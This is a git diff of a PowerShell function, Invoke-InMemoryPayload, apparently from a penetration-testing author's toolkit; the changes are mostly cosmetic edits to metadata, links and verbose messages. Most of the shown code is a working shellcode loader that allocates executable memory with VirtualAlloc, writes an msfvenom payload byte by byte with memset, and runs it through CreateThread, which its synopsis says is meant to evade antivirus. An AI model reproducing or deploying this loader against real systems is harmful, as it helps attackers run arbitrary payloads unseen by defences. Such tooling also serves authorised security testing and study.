@@ -1,3 +1,4 @@
+Function Invoke-InMemoryPayload {
 <#
 .SYNOPSIS
 Injects an msfvenom payload into a Windows machines memory as a way to attempt evading Anti-Virus protections. This was built thanks to information from the Offensive Security PWK Course
@@ -25,7 +26,7 @@ None
 
 
 .NOTES
-Author: Rob Osborne
+Author: Robert H. Osborne
 Alias: tobor
 Contact: rosborne@osbornepro.com
 
@@ -33,8 +34,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -42,7 +45,6 @@ https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 #>
-Function Invoke-InMemoryPayload {
     [CmdletBinding()]
         param(
             [Parameter(
@@ -54,7 +56,7 @@ Function Invoke-InMemoryPayload {
             [Byte[]]$ShellCode
         )  # End param
 
-    Write-Verbose "Importing DLL's..."
+    Write-Verbose -Message "Importing DLL's..."
     $CSCode = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -69,14 +71,14 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     If ($ShellCode.Length -gt 0x1000) {
 
         $Size = $ShellCode.Length
-        Write-Verbose "Length of payload is $Size"
+        Write-Verbose -Message "Length of payload is $Size"
 
     }  # End If
 
     Write-Verbose "Allocating a block of memory for execution using VirtualAlloc()..."
     $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)
 
-    Write-Verbose "Writing payload to newly allocated memory block using memset()..."
+    Write-Verbose -Message "Writing payload to newly allocated memory block using memset()..."
     For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) {
 
         Try {
@@ -85,7 +87,7 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
         } Catch [Exception] {
 
-            $Error[0]
+            Write-Error -Message $Error[0]
             Throw "[x] There was an error executing payload. Cmdlet is being prevented from allocating memory with the utilized DLLs."
 
         } Catch {
@@ -96,7 +98,7 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
     }  # End For
 
-    Write-Verbose "Executing in separte thread using CreateThread()..."
+    Write-Verbose -Message "Executing in separte thread using CreateThread()..."
     $WinFunc::CreateThread(0,0,$X,0,0,0)
     For (;;) {
 
